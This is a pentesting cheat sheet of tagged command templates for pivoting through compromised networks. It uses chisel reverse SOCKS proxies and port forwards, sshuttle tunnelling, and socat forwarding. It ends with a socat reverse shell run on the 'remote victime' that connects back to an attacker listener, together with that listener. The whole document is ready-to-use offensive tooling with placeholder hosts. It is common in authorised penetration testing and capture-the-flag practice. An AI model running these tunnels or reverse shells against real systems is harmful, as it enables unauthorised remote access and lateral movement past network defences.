# chisel

% chisel

## chisel server (server on local machine)
#plateform/linux  #target/remote  #cat/PIVOT 
```
chisel server -p <server-port|8080> --socks5 --reverse
```

## chisel socks proxy (client on remote machine)
#plateform/windows  #target/remote  #cat/PIVOT 
```
chisel client --fingerprint <FINGERPRINT> <server-ip>:<server-port> R:1080:socks
```


## chisel reverse port forwarding (client on remote machine) - forward client port on server
#plateform/linux  #target/remote  #cat/PIVOT 
```
chisel client <server-ip>:<server-port> R:<server-lport>:<client-ip>:<client-port>
```

## chisel remote port forwarding (client on remote machine) - forward server port on client
#plateform/linux  #target/remote  #cat/PIVOT 
```
chisel client -v <server-ip>:<server-port|8000> <client-ip|0.0.0.0>:<client-port>:<server-ip|127.0.0.1>:<server-port>
```

# sshuttle

## sshuttle - Forwarding traffic through
```
sshuttle -r <user>@<target-ip> <IP|IP/CIDR>
```

## sshuttle - Auto detect networks
```
sshuttle -vNr <user>@<target-ip>
```

# socat

% socat

## socat port forwarding listener (on local machine)
#plateform/linux  #target/remote  #cat/PIVOT 
```
./socat TCP-LISTEN:<port_listener|4444>,fork,reuseaddr TCP-LISTEN:<port_to_forward>
```

## socat port forwarding connect (on remote machine)
#plateform/linux  #target/remote  #cat/PIVOT 
```
./socat TCP:<connect_ip>:<connect_port|4444> TCP:127.0.0.1:<port_to_forward>
```

## socat reverse shell (remote victime)
#plateform/linux  #target/remote  #cat/PIVOT 
```
./socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:<listner_ip>:<listner_port|4444>
```

## socat reverse shell listener (local)
#plateform/linux  #target/remote  #cat/PIVOT 
```
socat file:`tty`,raw,echo=0 tcp-listen:<listner_port|4444>
```

